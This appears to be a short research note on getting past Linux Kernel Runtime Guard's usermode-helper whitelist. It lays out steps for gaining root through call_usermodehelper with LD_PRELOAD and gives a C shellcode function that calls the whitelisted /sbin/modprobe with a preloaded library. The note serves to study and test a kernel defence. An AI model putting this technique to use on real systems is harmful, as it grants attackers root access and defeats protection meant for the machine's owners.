call_usermodehelper (ld_preload)
================================

There is a whitelist of allowed usermodehelpers since LKRG 6.0 (https://www.openwall.com/lists/lkrg-users/2019/02/19/1). Calling a binary which is not in the list will trigger the alarm.

The idea of using `call_usermodehelper()` function (UMH) along with LD_PRELOAD is the following:
1) Create a shell binary
2) Create a shared object library which being preloaded to superuser process will change shell's file properties so it will be owned by root:root with SUID bit set
2) Exploit the vulnerability, schedule the "shellcode" with `schedule_on_each_cpu()` and use UMH with whitelisted binary and LD_PRELOAD set

Here is the modified `shellcode()` function which will do the privelege escalation:

~~~
void shellcode(void) {
	int (*call_usermodehelper)(const char *, void *, void *, int) = (void *)X_call_usermodehelper;
	char *argv[] = { (char []){ "/sbin/modprobe" }, 0 };
	char *envp[] = { (char []){ LD_PRELOAD_SHELL }, 0 };
	call_usermodehelper(argv[0], argv, envp, 1);
}
~~~
